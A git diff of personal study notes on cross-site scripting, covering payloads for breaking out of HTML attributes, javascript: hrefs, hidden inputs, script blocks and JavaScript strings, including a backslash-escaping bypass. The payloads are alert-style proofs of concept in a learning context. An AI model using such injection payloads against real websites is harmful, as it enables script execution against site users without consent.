@@ -73,12 +73,12 @@ To do...
     - `<body onresize="print()">` with this payload (for reflected XSS) you need an exploit server and iframe tag
 ### XSS in HTML tag attributes
 - When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.
-- `"><script>alert(document.domain)</script>`
+  - `"><script>alert(document.domain)</script>`
 - More commonly in this situation, angle brackets are blocked or encoded. In this case you can introduce a new attribute that creates a scriptable context.
-- `" autofocus onfocus=alert(document.domain) x="`
+  - `" autofocus onfocus=alert(document.domain) x="`
 - Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context.
   - If the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script
-  - `<a href="javascript:alert(document.domain)">`
+    - `<a href="javascript:alert(document.domain)">`
 - Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in:
   - Hidden inputs because events like onmouseover and onfocus can't be triggered due to the element being invisible
     - `<input type="hidden" accesskey="X" onclick="alert(1)">`
@@ -91,13 +91,21 @@ To do...
 ### XSS into JavaScript
 - Terminating the existing script (I don't really know why this works but it works)
   - The browser incorrectly interprets the `</script>` sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.
-```
-<script>
-...
-var input = 'controllable data here';
-...
-</script>
-```
-```
-</script><img src=1 onerror=alert(document.domain)>
-```
+      - ```
+        <script>
+        ...
+        var input = 'controllable data here';
+        ...
+        </script>
+        ```
+        ```
+        </script><img src=1 onerror=alert(document.domain)>
+        ```
+- Breaking out of a JavaScript string
+  - It's essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing
+    - ```
+      '-alert(document.domain)-'
+      ';alert(document.domain)//
+      ```
+  - Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.
+    - ` ';alert(document.domain)// ` is converted to `\';alert(document.domain)//` so your input could be `\';alert(document.domain)//` which gets converted to `\\';alert(document.domain)//`
